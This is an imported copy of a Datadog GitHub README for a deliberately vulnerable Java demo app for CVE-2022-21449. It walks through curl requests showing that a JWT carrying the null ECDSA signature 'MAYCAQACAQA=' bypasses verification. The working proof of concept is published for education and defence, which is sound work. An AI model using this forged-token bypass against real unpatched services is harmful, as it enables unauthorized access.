---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-04-19_lab-by-datadoghq.md
original_filename: 2022-04-19_lab-by-datadoghq.md
title: Lab by @datadoghq
category: documents
detected_topics:
- jwt
- access-control
- command-injection
- otp
- supply-chain
tags:
- imported
- documents
- jwt
- access-control
- command-injection
- otp
- supply-chain
language: en
raw_sha256: 40b79e3d7e3b6c1535eeaddd6d0c720f3c24cf01fe6be892cac04309303b1e55
text_sha256: af8d76cab3070b238e84b81dd8987a1196fb5b81729bce052257596e856315ca
ingested_at: '2026-06-28T07:32:11Z'
sensitivity: unknown
redactions_applied: true
---

# Lab by @datadoghq

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-04-19_lab-by-datadoghq.md
- Source Type: markdown
- Detected Topics: jwt, access-control, command-injection, otp, supply-chain
- Ingested At: 2026-06-28T07:32:11Z
- Redactions Applied: True
- Raw SHA256: `40b79e3d7e3b6c1535eeaddd6d0c720f3c24cf01fe6be892cac04309303b1e55`
- Text SHA256: `af8d76cab3070b238e84b81dd8987a1196fb5b81729bce052257596e856315ca`


## Content

---
title: "Lab by @datadoghq"
page_title: "security-labs-pocs/proof-of-concept-exploits/jwt-null-signature-vulnerable-app at main · DataDog/security-labs-pocs · GitHub"
url: "https://github.com/DataDog/security-labs-pocs/tree/main/proof-of-concept-exploits/jwt-null-signature-vulnerable-app"
final_url: "https://github.com/DataDog/security-labs-pocs/tree/main/proof-of-concept-exploits/jwt-null-signature-vulnerable-app"
authors: ["Neil Madden (@neilmaddog)"]
programs: ["Oracle"]
bugs: ["Signature bypass", "Cryptographic issues"]
publication_date: "2022-04-19"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2696
---

# Exploitation and Sample Vulnerable Application of the JWT Null Signature Vulnerability (CVE-2022-21449)

This folder contains a sample web application vulnerable to [CVE-2022-21449](https://neilmadden.blog/2022/04/19/psychic-signatures-in-java/), a vulnerability in the Java JDKs 15 to 18 allowing to bypass signature checks using ECDSA signatures (based on elliptic curves).

## Running the application

Run it:
  
  
  docker run --name vulnerable-app --rm -p 8080:8080 ghcr.io/datadog/jwt-null-signature-vulnerable-app
  

Built it yourself:
  
  
  docker build . -t vulnerable-app
  docker run -p 8080:8080 --name vulnerable-app --rm vulnerable-app
  

## Exploitation steps

The application has a single endpoint that requires authenticating with a valid JWT (with regard to a randomly-generated private key):
  
  
  $ curl localhost:8080 -sSL -D-
  HTTP/1.1 401
  Content-Type: text/plain;charset=UTF-8
  Content-Length: 46
  Date: Wed, 20 Apr 2022 14:53:06 GMT
  
  You are not authorized to access this endpoint
  

Specifying an invalid JWT (for instance, signed with any EC256 key) returns an error as well:
  
  
  # Generated on https://token.dev/ with the algorithm "ES256"
  $ JWT=eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiJ9.eyJzdWIiOiJSaWNrIEFzdGxleSIsImFkbWluIjp0cnVlLCJpYXQiOjE2NTA0NjY1MDIsImV4cCI6MTkwMDQ3MDEwMn0.R05LldFQf7kay5-8hPeJYnYD_ehxKAKFXo-t6Qt7ZKUKkQ***REDACTED-SUSPECT-TOKEN***  $ curl localhost:8080 -sSL -D- -H "Authorization: Bearer $JWT"
  HTTP/1.1 401
  Content-Type: text/plain;charset=UTF-8
  Content-Length: 11
  Date: Wed, 20 Apr 2022 14:56:04 GMT
  
  Invalid JWT

However, specifying an ECDSA signature with `r=s=0` encoded in DER, `MAYCAQACAQA=`, allows us to bypass the JWT verification check!
  
  
  $ echo -ne "MAYCAQACAQA=" | base64 -d | openssl asn1parse -inform der
  0:d=0  hl=2 l=  6 cons: SEQUENCE
  2:d=1  hl=2 l=  1 prim: INTEGER  :00
  5:d=1  hl=2 l=  1 prim: INTEGER  :00
  
  
  # Same JWT as above with the malicious signature
  $ JWT=eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiJ9.eyJzdWIiOiJSaWNrIEFzdGxleSIsImFkbWluIjp0cnVlLCJpYXQiOjE2NTA0NjY1MDIsImV4cCI6MTkwMDQ3MDEwMn0.MAYCAQACAQA
  $ curl localhost:8080 -sSL -D- -H "Authorization: Bearer $JWT"
  HTTP/1.1 200
  Content-Type: text/plain;charset=UTF-8
  Content-Length: 19
  Date: Wed, 20 Apr 2022 14:59:18 GMT
  
  Hello, Rick Astley!

## Notes

This demo makes of use of the popular [jjwt](https://github.com/jwtk/jjwt) library. Similar vulnerabilities are likely to affect other Java-based JWT libraries running on vulnerable JDK versions - the vulnerability does not lie in the libraries themselves, but in the cryptographical primitives provided by the vulnerable JDK.

## Credits

  * Disclosure: <https://neilmadden.blog/2022/04/19/psychic-signatures-in-java/> by Neil Madden
  * This repository: Thomas Etrillard, [Christophe Tafani-Dereeper](https://twitter.com/christophetd)
